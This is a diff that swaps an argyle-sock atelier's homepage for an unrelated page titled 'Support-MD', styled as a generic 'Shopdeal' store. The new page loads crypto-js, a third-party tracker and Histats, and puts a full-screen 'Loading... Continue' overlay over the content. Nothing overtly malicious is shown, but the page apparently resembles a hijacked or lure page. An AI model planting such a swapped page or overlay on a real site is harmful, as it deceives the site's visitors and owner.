@@ -1,699 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ArgyleKnitUp | Artisanal Scottish Argyle Knit Hosiery</title>
-  <meta name="description" content="Discover bespoke Scottish argyle knit socks, 17.5-micron Saxon merino wool, hand-linked seamless toes, and 200-needle intarsia hosiery crafted in New York.">
-  <link rel="canonical" href="https://argyleknitup.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,600&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <!-- Google Analytics Tag G-0LY0HY7L01 -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
-  <link rel="stylesheet" href="assets/css/style.css">
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-<header class="site-header">
-  <div class="header-inner">
-    <a href="index.php" class="brand-logo">
-      Argyle<span>KnitUp</span>
-    </a>
-    <ul class="nav-links">
-      <li><a href="index.php" class="active">Atelier Home</a></li>
-      <li><a href="about.html" class="">Hosiery Heritage</a></li>
-      <li><a href="blog.html" class="">Textile Treatises</a></li>
-      <li><a href="contact.html" class="">Commission Desk</a></li>
-    </ul>
-    <div class="header-cta">
-      <a href="tel:+18887775845" style="font-family:var(--font-mono);font-size:0.85rem;font-weight:600;color:var(--color-slate-700);">+1-888-777-5845</a>
-      <a href="contact.html" class="btn btn-primary">Custom Commission</a>
-      <button class="mobile-toggle" id="mobile-toggle" aria-label="Toggle navigation menu">
-        <span></span>
-        <span></span>
-        <span></span>
-      </button>
-    </div>
-  </div>
-</header>
-<div class="mobile-drawer" id="mobile-drawer">
-  <ul class="mobile-drawer-nav">
-    <li><a href="index.php">Atelier Home</a></li>
-    <li><a href="about.html">Hosiery Heritage</a></li>
-    <li><a href="blog.html">Textile Treatises</a></li>
-    <li><a href="contact.html">Commission Desk</a></li>
-    <li style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--color-border);">
-      <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-slate-600);margin-bottom:0.5rem;">Direct Telephone:</p>
-      <a href="tel:+18887775845" style="font-size:1.1rem;font-weight:700;color:var(--color-accent);">+1-888-777-5845</a>
-    </li>
-    <li>
-      <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-slate-600);margin-bottom:0.5rem;">Atelier Gallery:</p>
-      <p style="font-size:0.95rem;color:var(--color-slate-800);">181 Mercer Street, New York, NY 10012, United States</p>
-    </li>
-  </ul>
-</div>
-
-<!-- Section 1: Hero Banner -->
-<section class="hero">
-  <div class="container">
-    <div class="hero-grid">
-      <div>
-        <div class="hero-badge">
-          <span>&#9670;</span> Bespoke Scottish Argyle Intarsia Atelier
-        </div>
-        <h1 class="hero-title">
-          The Noble Art of Scottish Argyle Hosiery.
-        </h1>
-        <p class="hero-desc">
-          ArgyleKnitUp revives the prestigious heritage of seventeenth-century Argyll clan tartan knitwear. Handcrafted on 200-needle circular frames using ultra-fine 17.5-micron Saxon merino wool and Mongolian cashmere, each pair features seamless hand-linked toes and indestructible reinforced heels.
-        </p>
-        <div style="display:flex;gap:1.25rem;align-items:center;flex-wrap:wrap;">
-          <a href="contact.html" class="btn btn-primary">Commission Bespoke Hosiery</a>
-          <a href="about.html" class="btn btn-outline">Explore Atelier Heritage &rarr;</a>
-        </div>
-        <div style="margin-top:2.5rem;display:flex;gap:2.5rem;border-top:1px solid var(--color-border);padding-top:1.5rem;">
-          <div>
-            <div style="font-family:var(--font-serif);font-size:1.85rem;font-weight:700;color:var(--color-accent);">17.5 &mu;</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-600);text-transform:uppercase;font-family:var(--font-mono);">Saxon Merino Wool</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-serif);font-size:1.85rem;font-weight:700;color:var(--color-accent);">200 N</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-600);text-transform:uppercase;font-family:var(--font-mono);">Cylinder Gauge</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-serif);font-size:1.85rem;font-weight:700;color:var(--color-accent);">100%</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-600);text-transform:uppercase;font-family:var(--font-mono);">Hand-Linked Toes</div>
-          </div>
-        </div>
-      </div>
-      <div class="hero-img-box">
-        <img src="assets/images/hero_argyle_merino_knit_hosiery.jpg" alt="Heritage Scottish argyle knit merino wool socks on wooden foot form" class="hero-img">
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-<!-- Section 2: Four Pillars of Argyle Craftsmanship -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Highland Guild Standards</span>
-      <h2 class="section-title">The Four Pillars of Argyle Textile Mastery</h2>
-      <p class="section-lead">
-        True sartorial hosiery blends mathematical intarsia geometry with friction-free comfort and thermal breathability.
-      </p>
-    </div>
-    <div class="grid-4">
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar I</span>
-          <h3 class="card-title">True Intarsia Geometry</h3>
-          <p class="card-desc">
-            Independent yarn carriers knit solid diamond blocks without floating threads inside, preventing bunching and yarn snags against the calf.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar II</span>
-          <h3 class="card-title">Hand-Linked Seamless Toes</h3>
-          <p class="card-desc">
-            Each individual loop across the toe seam is linked by hand using a single thread, completely eliminating irritating machine ridges and blisters.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar III</span>
-          <h3 class="card-title">17.5-Micron Saxon Merino</h3>
-          <p class="card-desc">
-            Superfine long-staple fleece spun into two-fold combed yarns provides silky itch-free softness, natural crimp resilience, and odor resistance.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar IV</span>
-          <h3 class="card-title">Reinforced Y-Heel Pocket</h3>
-          <p class="card-desc">
-            Interlaced with high-tenacity polyamide fibers along high-wear heel and ball-of-foot zones, tested to withstand 100,000 Martindale rubs.
-          </p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-<!-- Section 3: Signature Argyle Collections -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Atelier Catalog</span>
-      <h2 class="section-title">Signature Argyle Knit Silhouettes</h2>
-      <p class="section-lead">
-        Explore our benchmark silhouettes ranging from executive over-the-calf dress hose to plush fireside cashmere bed socks.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/featured_argyle_dress_crew_sock.jpg" alt="Featured argyle dress crew sock">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Over-The-Calf &bull; 200-Needle Gauge</span>
-          <h3 class="card-title">The Balmoral Executive Argyle</h3>
-          <p class="card-desc">
-            Full-calf dress hose in midnight navy with forest green diamonds and gold overcheck pinstripe. Designed to stay smooth beneath tailored trousers.
-          </p>
-          <a href="contact.html" class="btn btn-outline" style="margin-top:auto;">Commission This Silhouette &rarr;</a>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
       </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/traditional_argyle_diamond_intarsia.jpg" alt="Traditional argyle diamond intarsia">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Mid-Calf Crew &bull; Cashmere Blend</span>
-          <h3 class="card-title">The Glencoe Heritage Crew</h3>
-          <p class="card-desc">
-            Knitted from 70% Saxon merino and 30% Mongolian cashmere. Features rich heathered rust and peat-brown diamonds with hand-linked toe seams.
-          </p>
-          <a href="contact.html" class="btn btn-outline" style="margin-top:auto;">Commission This Silhouette &rarr;</a>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/comfort_lounge_cashmere_knit.jpg" alt="Comfort lounge cashmere knit">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Heavy Gauge &bull; 100% Pure Cashmere</span>
-          <h3 class="card-title">The Highlands Fireside Sock</h3>
-          <p class="card-desc">
-            Sumptuous 6-ply cashmere knit engineered for fireside comfort, weekend lounging, and cold winter evenings with ribbed turn-down cuff.
-          </p>
-          <a href="contact.html" class="btn btn-outline" style="margin-top:auto;">Commission This Silhouette &rarr;</a>
-        </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </div>
-</section>
 
-<!-- Section 4: Interactive Argyle Yarn & Compression Calculator -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="calc-box">
-      <div class="calc-grid">
-        <div>
-          <span class="section-tag">Interactive Textile Telemetry</span>
-          <h2 style="font-family:var(--font-serif);font-size:2.2rem;color:var(--color-slate-900);margin-bottom:1rem;">
-            Yarn Gauge &amp; Compression Estimator
-          </h2>
-          <p style="color:var(--color-slate-600);margin-bottom:2rem;font-size:0.95rem;">
-            Configure your intended sock length, fiber composition, and knitting frame cylinder gauge to model estimated knit density, graduated calf compression, and friction lifespan.
-          </p>
-          <div class="calc-group">
-            <label for="calc-hosiery-style">Hosiery Length Silhouette</label>
-            <select id="calc-hosiery-style" class="calc-select">
-              <option value="full-calf" selected>Over-The-Calf Executive Dress (Stay-Up Rib)</option>
-              <option value="mid-calf">Classic Mid-Calf Crew (Daily Versatility)</option>
-              <option value="ankle-loafer">Ankle Loafer Cut (Low-Profile Sartorial)</option>
-            </select>
-          </div>
-          <div class="calc-group">
-            <label for="calc-fiber-blend">Fleece &amp; Fiber Composition</label>
-            <select id="calc-fiber-blend" class="calc-select">
-              <option value="pure-merino" selected>100% Superfine Saxon Merino (17.5 Micron)</option>
-              <option value="merino-cashmere">70% Merino / 30% Mongolian Cashmere</option>
-              <option value="merino-polyamide">80% Merino / 20% Technical Polyamide</option>
-            </select>
-          </div>
-          <div class="calc-group">
-            <label for="calc-needle-gauge">Knitting Frame Cylinder Gauge</label>
-            <select id="calc-needle-gauge" class="calc-select">
-              <option value="168-needle">168-Needle Dial Frame (Medium Gauge / Boot)</option>
-              <option value="200-needle" selected>200-Needle High-Precision Frame (Classic Dress)</option>
-              <option value="240-needle">240-Needle Ultra-Fine Gauge (Featherweight)</option>
-            </select>
-          </div>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
         </div>
-        <div>
-          <div class="calc-result">
-            <span style="font-family:var(--font-mono);font-size:0.8rem;text-transform:uppercase;color:var(--color-slate-600);">Knitting Stitch Density</span>
-            <div class="calc-stat-val" id="calc-density-val">42 CPI (Gauge 200)</div>
-            <p style="font-size:0.85rem;color:var(--color-slate-600);margin-bottom:1.75rem;">Courses per inch on relaxed washed fabric</p>
 
-            <div style="border-top:1px solid var(--color-border);padding-top:1.5rem;display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;">
-              <div>
-                <span style="font-family:var(--font-mono);font-size:0.75rem;text-transform:uppercase;color:var(--color-slate-600);">Venous Compression</span>
-                <div style="font-family:var(--font-serif);font-size:1.5rem;font-weight:700;color:var(--color-slate-900);margin-top:0.25rem;" id="calc-compression-val">18 mmHg (Graduated)</div>
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
               </div>
-              <div>
-                <span style="font-family:var(--font-mono);font-size:0.75rem;text-transform:uppercase;color:var(--color-slate-600);">Abrasion Durability</span>
-                <div style="font-family:var(--font-serif);font-size:1.5rem;font-weight:700;color:var(--color-slate-900);margin-top:0.25rem;" id="calc-longevity-val">10+ Yrs (100k Rubs)</div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
               </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
-            <div style="margin-top:2rem;">
-              <a href="contact.html" class="btn btn-primary" style="width:100%;">Commission With These Exact Specs</a>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
             </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 5: Anatomy of an Argyle Knit Sock -->
-<section class="section">
-  <div class="container">
-    <div class="grid-2" style="align-items:center;">
-      <div>
-        <span class="section-tag">Anatomical Hosiery Engineering</span>
-        <h2 class="section-title">Anatomy of an Heirloom Argyle Sock</h2>
-        <p class="section-lead" style="margin-bottom:2rem;">
-          Beneath the iconic Scottish diamond pattern lies an intricate six-zone architectural build designed to prevent sagging, bunching, and toe friction.
-        </p>
-        <div style="display:flex;flex-direction:column;gap:1.5rem;">
-          <div style="display:flex;gap:1rem;align-items:flex-start;">
-            <div style="width:32px;height:32px;border-radius:50%;background:var(--color-accent);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;">1</div>
-            <div>
-              <h4 style="font-family:var(--font-serif);font-size:1.15rem;color:var(--color-slate-900);margin-bottom:0.25rem;">Double-Welted Stay-Up Cuff</h4>
-              <p style="font-size:0.9rem;color:var(--color-slate-600);">Graduated elastomeric inlay keeps the sock smoothly positioned just below the knee without constricting arterial blood flow.</p>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
